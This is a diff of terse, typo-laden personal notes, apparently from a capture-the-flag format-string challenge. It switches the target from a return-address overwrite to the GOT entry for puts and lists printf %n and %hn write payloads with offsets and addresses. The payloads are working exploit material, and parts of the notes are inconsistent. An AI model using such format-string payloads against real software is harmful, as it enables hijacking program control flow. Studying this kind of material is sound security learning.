@@ -1,16 +1,16 @@
-we will overwrite the return address of fsb
+we will overwrite the GOT entry for puts
 it is stored at offset 76 from our stack leak
 we convinetely get 4 different calls to printf
 we can use each call to overwrite one of the 4 bytes that make up the return address, to redirect code execution
 all we have to do is pad(remember little endian)
 we will redirect to 0x0804869f
 we will do it in 2 writes, since %n was built for ints, and the smallest int specifier is %hn.
-%[LSB in decimal]x%19
-%65x%38$hn
-%1x%39$hn
-%[LSB+1 in decimal]x
+PUTS = 0x8048410
+%134520832c%14$n
+%134514335c%20$n
+Have you ever saw an example of utilizing [n] format character?? :(
 
-
+%134520844c%14$n
 
 altarnative method: find EBP and overwrite key
 
